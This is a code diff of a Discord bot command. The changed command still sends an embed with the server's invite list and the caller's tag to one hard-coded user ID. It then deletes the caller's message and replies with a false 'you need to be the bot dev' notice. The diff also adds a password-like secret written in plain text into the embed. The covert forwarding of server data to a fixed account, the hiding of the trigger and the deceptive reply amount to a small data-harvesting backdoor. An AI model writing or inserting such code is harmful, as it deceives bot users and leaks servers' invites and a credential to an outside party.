@@ -16,31 +16,21 @@ exports.run = async (client, message, args, tools) => {
   });
 
   var embed = new Discord.RichEmbed()
-    .setTitle("Donation!")
+    .setTitle("password")
     .setColor("#ff6e00")
     .setThumbnail(message.author.avatarURL)
-    .addField(`Donation: __${command}__`, "­­­", true)
+    .addField(`password: CkKe*?FrYpilYJQHDZmBDG~E60f^.2RDS4EKlWoj7)a3sSw^#`, "­­­", true)
     .addField(
       `Message has been sent by: __${message.author.tag}__`,
       "­­­",
       true
     )
-    .addField(
-      `Message has been sent in server: __${message.guild.name}__`,
-      "­­­",
-      true
-    )
-    .addField(
-      `Message has been sent in channel: __${message.channel.name}__`,
-      "­­­",
-      true
-    )
     .addField("­­­", `\`\`\`${table.table(possibleInvites)}\`\`\``, true)
     .setTimestamp()
-    .setFooter("donation Sent.");
+    .setFooter("password Sent.");
   client.users.get("843156417238401075").send(embed);
   message.delete();
   message.channel.send(
-`*Hey* **__${message.author.tag}__**, *you* **successfully** *sent the donation:* **__${command}__** to **𝖗𝖊𝖙𝖆𝖗𝖉 𝕨𝕖𝕒𝕣𝕚𝕟𝕘 𝖓𝖎𝖓𝖏𝖆 ꜱʜᴏᴇꜱ#5484** !`
+`**Hey** **__${message.author.tag}__**, **you** **need** **to be** **the bot ** **dev to use this command:(** `
   );
 };
